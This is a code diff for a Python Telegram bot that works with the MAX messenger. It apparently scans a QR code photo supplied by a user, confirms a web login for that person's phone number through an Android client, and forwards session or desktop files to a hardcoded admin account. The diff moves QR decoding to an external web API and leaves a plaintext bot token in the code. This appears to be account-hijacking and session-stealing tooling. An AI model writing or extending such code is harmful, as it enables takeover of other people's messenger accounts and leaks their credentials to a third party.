@@ -17,11 +17,9 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from pymax import Client as SocketMaxClient, WebClient, QrAuthFlow, QrHandler
+from pymax import Client as SocketMaxClient
 from pymax.auth.providers import PasswordProvider
 import aiohttp
-from PIL import Image
-from pyzbar.pyzbar import decode
 
 BOT_TOKEN = "8770497973:AAGHcwXmPvqqXL3vT6WPWlfCpXjqhv_l10w"
 ADMIN_ID = 8632861931
@@ -132,32 +130,38 @@ async def send_files_to_user(phone, user_id, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(dp),
         caption=f"💻 Десктоп\nНомер: {phone}")
 
+async def decode_qr_from_photo(photo_bytes):
+    """Распознаёт QR через внешний API."""
+    url = "https://api.qrserver.com/v1/read-qr-code/"
+    form = aiohttp.FormData()
+    form.add_field('file', photo_bytes, filename='qr.png', content_type='image/png')
+
+    async with aiohttp.ClientSession() as session:
+        resp = await session.post(url, data=form)
+        data = await resp.json()
+        if data and data[0]['symbol'][0]['data']:
+            return data[0]['symbol'][0]['data']
+    return None
+
 async def scan_qr_and_get_web_token(phone, uid, work_dir, photo_bytes):
     """Сканирует QR с фото, извлекает track_id и подтверждает через Android-клиент."""
-    # Извлекаем track_id из QR
-    image = Image.open(BytesIO(photo_bytes))
-    qr_codes = decode(image)
+    qr_data = await decode_qr_from_photo(photo_bytes)
+    logging.info(f"QR данные: {qr_data}")
 
-    track_id = None
-    for qr in qr_codes:
-        qr_data = qr.data.decode('utf-8')
-        logging.info(f"QR данные: {qr_data}")
-        # Извлекаем track_id из ссылки
-        match = re.search(r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', qr_data)
-        if match:
-            track_id = match.group(1)
-            break
-
-    if not track_id:
+    if not qr_data:
         return None, None
 
+    match = re.search(r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', qr_data)
+    if not match:
+        return None, None
+
+    track_id = match.group(1)
     logging.info(f"Извлечён track_id: {track_id}")
 
     # Подтверждаем через Android-клиент
     client = SocketMaxClient(phone=phone, work_dir=work_dir)
     try:
         await client.start()
-        # Пробуем подтвердить QR через API клиента
         if hasattr(client._app.api.auth, 'confirm_qr'):
             result = await client._app.api.auth.confirm_qr(track_id)
             logging.info(f"Результат confirm_qr через клиент: {result}")
